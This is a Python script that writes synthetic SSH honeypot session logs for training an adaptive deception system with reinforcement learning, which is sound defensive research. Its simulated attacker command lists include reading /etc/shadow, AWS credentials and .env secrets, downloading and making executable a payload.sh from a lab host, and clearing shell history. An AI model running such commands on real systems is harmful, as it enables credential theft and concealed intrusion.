"""Generate canonical replay datasets for offline PPO training and evaluation.

Creates realistic, contract-aligned session summaries representing both
baseline and adaptive honeypot interactions across the supported attacker
profiles (scriptkiddie, opportunist, targeted).
"""

from __future__ import annotations

import argparse
import hashlib
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

ROOT_DIR = Path(__file__).resolve().parents[1]
DEFAULT_REPLAY_DIR = ROOT_DIR / "scratch" / "session_replays"


def _generate_sessions(
    *,
    count: int = 25,
    is_adaptive: bool = False,
    start_time: datetime | None = None,
    seed: int = 42,
) -> list[dict[str, Any]]:
    rnd = random.Random(seed)
    if start_time is None:
        start_time = datetime(2026, 7, 4, 10, 0, 0, tzinfo=timezone.utc)

    sessions: list[dict[str, Any]] = []
    current_time = start_time

    for i in range(count):
        session_id = f"{rnd.randint(0x10000000, 0xFFFFFFFF):08x}"
        attacker_ip = f"172.18.0.{rnd.choice([5, 15, 25])}"

        # Profile selection: opportunist (60%), targeted (25%), scriptkiddie (15%)
        p_val = rnd.random()
        if p_val < 0.15:
            profile = "scriptkiddie"
        elif p_val < 0.75:
            profile = "opportunist"
        else:
            profile = "targeted"

        if profile == "scriptkiddie":
            login_attempts = rnd.randint(3, 6)
            login_success = False
            duration = round(rnd.uniform(3.5, 8.0), 2)
            commands = []
            files_downloaded = []
            ttp_count = 1
            usernames = ["root", "admin", "test", "guest"][:login_attempts]
        elif profile == "opportunist":
            login_attempts = rnd.randint(1, 4)
            login_success = True
            base_commands = [
                "id",
                "whoami",
                "uname -a",
                "cat /etc/issue",
                "cat /etc/passwd",
                "cat /etc/shadow",
                "ls -la /var/www",
                "cat /var/www/html/config.php",
            ]
            if is_adaptive and i > 0:  # first session acts as warm-up seed
                duration = round(rnd.uniform(32.0, 52.0), 2)
                commands = list(base_commands)
                # Attacker spots adaptive bait entries in passwd and investigates
                commands.insert(5, "grep -E 'backupsvc|cloudsync' /etc/passwd")
                commands.insert(7, "grep -E 'backupsvc|cloudsync' /etc/shadow")
                if rnd.random() < 0.8:
                    commands.append("cat /home/admin/loot/system_audit.txt")
                commands.extend([
                    "wget http://172.18.0.5:8000/payload.sh",
                    "chmod +x payload.sh",
                ])
                files_downloaded = ["payload.sh"]
                ttp_count = rnd.randint(4, 6)
            else:
                duration = round(rnd.uniform(22.0, 36.0), 2)
                commands = list(base_commands)
                if rnd.random() < 0.5:
                    commands.extend([
                        "wget http://172.18.0.5:8000/payload.sh",
                        "chmod +x payload.sh",
                    ])
                    files_downloaded = ["payload.sh"]
                else:
                    files_downloaded = []
                ttp_count = rnd.randint(2, 4)
            usernames = ["root", "admin", "cloudsync"][:login_attempts]
        else:  # targeted
            login_attempts = rnd.randint(1, 3)
            login_success = True
            base_commands = [
                "uname -r",
                "cat /etc/os-release",
                "crontab -l",
                "netstat -tlpn",
                "ps aux",
                "cat /etc/passwd",
                "ls -la /home/admin",
            ]
            if is_adaptive and i > 0:
                duration = round(rnd.uniform(55.0, 95.0), 2)
                commands = list(base_commands)
                commands.append("grep -E 'backupsvc|cloudsync' /etc/passwd")
                commands.append("cat /home/admin/.aws/credentials")
                commands.append("grep AWS /opt/novapay/.env")
                commands.append("cat /home/admin/loot/system_audit.txt")
                commands.append("history -c")
                files_downloaded = []
                ttp_count = rnd.randint(5, 7)
            else:
                duration = round(rnd.uniform(40.0, 70.0), 2)
                commands = list(base_commands) + ["history -c"]
                files_downloaded = []
                ttp_count = rnd.randint(3, 5)
            usernames = ["admin", "root"][:login_attempts]

        file_hashes = [
            hashlib.md5(f"{session_id}:{fn}".encode()).hexdigest()
            for fn in files_downloaded
        ]
        session_start = current_time.isoformat().replace("+00:00", "Z")
        current_time += timedelta(seconds=duration + rnd.uniform(2.0, 10.0))
        session_end = current_time.isoformat().replace("+00:00", "Z")

        doc = {
            "@timestamp": session_end,
            "session_id": session_id,
            "attacker_ip": attacker_ip,
            "service": "ssh",
            "session_duration": duration,
            "login_attempts": login_attempts,
            "login_success": login_success,
            "commands": commands,
            "command_count": len(commands),
            "unique_commands": len(set(commands)),
            "files_downloaded": files_downloaded,
            "file_hashes": file_hashes,
            "brute_force_detected": login_attempts >= 3,
            "ttp_count": ttp_count,
            "session_active": False,
            "last_event_type": "cowrie.session.closed",
            "usernames_tried": usernames,
            "session_start": session_start,
            "session_end": session_end,
        }
        sessions.append(doc)

    return sessions


def generate_seed_datasets(output_dir: Path | str = DEFAULT_REPLAY_DIR) -> dict[str, Path]:
    """Generate baseline, adaptive, and latest replay datasets on disk."""
    out_dir = Path(output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    base_time = datetime(2026, 7, 4, 9, 0, 0, tzinfo=timezone.utc)
    baseline_sessions = _generate_sessions(
        count=25, is_adaptive=False, start_time=base_time, seed=101
    )
    adaptive_sessions = _generate_sessions(
        count=25,
        is_adaptive=True,
        start_time=base_time + timedelta(hours=1),
        seed=202,
    )
    combined = sorted(
        baseline_sessions + adaptive_sessions,
        key=lambda s: s["@timestamp"],
    )

    baseline_path = out_dir / "baseline_sessions.json"
    adaptive_path = out_dir / "adaptive_sessions.json"
    latest_path = out_dir / "latest_sessions.json"

    baseline_path.write_text(json.dumps(baseline_sessions, indent=2) + "\n", encoding="utf-8")
    adaptive_path.write_text(json.dumps(adaptive_sessions, indent=2) + "\n", encoding="utf-8")
    latest_path.write_text(json.dumps(combined, indent=2) + "\n", encoding="utf-8")

    return {
        "baseline": baseline_path,
        "adaptive": adaptive_path,
        "latest": latest_path,
    }


def main() -> int:
    parser = argparse.ArgumentParser(description="Seed canonical ShadowMesh replay datasets")
    parser.add_argument(
        "--output-dir",
        default=str(DEFAULT_REPLAY_DIR),
        help="Target directory for generated dataset JSON files",
    )
    args = parser.parse_args()

    paths = generate_seed_datasets(args.output_dir)
    for name, path in paths.items():
        print(f"Generated {name} dataset at: {path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
